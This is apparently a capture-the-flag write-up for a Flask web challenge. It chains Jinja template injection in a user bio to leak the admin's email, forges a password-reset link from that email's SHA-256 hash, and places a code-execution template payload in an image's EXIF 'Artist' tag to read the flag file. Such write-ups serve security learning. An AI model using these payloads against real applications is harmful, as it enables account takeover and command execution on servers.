This web ctf was easy but required me more attention to understand the backend source code that was provided.

Basically, its a python web app, then i saw that it was using templates with Flask to render some custom pages.

when i create a test account, i have to submit a verification with an image, then the admin needs to verify me.

but i saw that i cant still edit my profile without being verified yet. in the profile page, i can edit my bio and get my share link. The share link creates a page using a template at `/user/<username>/` then show my username and my bio.

Also, Flask use Jinja to render the template, and Jinja is vulnerable to SSTI if not correctly sanitize
So in the bio text, i put this SSTI payload to extract the admin email.
```python
{{User.query.filter_by(username="admin").first().email}}
```

Once i got the admin email, I can send a forgot password link.
because after checking the forget password function, it creates a link like that:
```python
reset_url = str(hashlib.sha256(email.encode()).hexdigest())
```
This mean i can create myself the link using the email i extracted.
I wrote a simple python script to print out the url:
```python
import hashlib

host = "154.57.164.82"
port= "30328"
url = f"http://{host}:{port}/changepasswd/"
email = "6b7a324f63736b77@master.guild"
hash_url = str(hashlib.sha256(email.encode()).hexdigest())
print(f"{url}{hash_url}")
```

Then i reset the admin password and login as the admin.

Now i can verify users, but not yet. The `/verify` checks if the image provided has the EXIF tag "Artist"
So at first my image didnt have any data in the "Artist" tag, so i wasnt able to verify my first account.

when the verification is good, it just render Verified {artist data}. but it uses the function `render_template_string()` which is also vulnerable to SSTI and it has no sanitazing. I can now print the flag from there.

I used an online tool to modify the EXIF data at the "Artist" tag and added this SSTI payload to read the flag.
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```